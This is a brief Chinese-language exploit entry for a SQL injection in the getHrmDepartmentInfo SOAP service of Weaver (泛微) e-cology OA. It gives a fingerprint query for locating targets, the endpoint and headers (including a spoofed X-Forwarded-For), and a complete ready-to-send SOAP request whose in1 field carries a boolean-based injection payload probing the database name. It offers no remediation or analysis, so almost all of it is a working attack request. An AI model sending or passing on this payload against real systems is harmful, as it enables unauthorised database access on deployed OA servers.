# 泛微getHrmDepartmentInfo存在sql注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="泛微-OA（e-cology）"`
- **请求**：`POST /services/HrmService HTTP/1.1`
- **关键头**：`SOAPAction: urn:weaver.hrm.webservice.HrmService.getHrmDepartmentInfo`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 427`　`X-Forwarded-For: 127.0.0.1`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrm="http://localhost/services/HrmService">
<soapenv:Header/>
<soapenv:Body>
<hrm:getHrmDepartmentInfo>
<!--type: string-->
<hrm:in0>gero et</hrm:in0>
<!--type: string-->
<hrm:in1>1)AND(db_name()like'ec%'</hrm:in1>
</hrm:getHrmDepartmentInfo>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　—